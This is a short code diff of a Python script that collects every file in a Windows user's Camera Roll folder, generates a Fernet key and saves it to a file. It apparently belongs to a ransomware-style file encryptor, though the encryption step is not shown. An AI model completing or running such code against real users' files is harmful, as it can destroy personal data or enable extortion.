@@ -1,7 +1,7 @@
 import os
 import scandir
 from cryptography.fernet import Fernet
-folder = os.path.expandvars("%userprofile%")+"/Pictures\Camera Roll"
+folder = os.path.expandvars("%userprofile%")+"/Pictures\Camera Roll" #can be changed to fit your needs
 i=0
 file_list = []
 
@@ -14,7 +14,7 @@ for paths, dirs, files in scandir.walk(folder):
         else:
             file_list.append(os.path.join(paths, file))
 
-key = Fernet.generate_key()
+
 #win11 ghostfilefilter
 while i <= len(file_list)-1:
     file_path =""
@@ -24,6 +24,7 @@ while i <= len(file_list)-1:
     i=i+1
 #end win11 ghostfilefilter
 
+key = Fernet.generate_key()
 with open("thekey.key", "wb") as thekey:
     thekey.write(key)
 
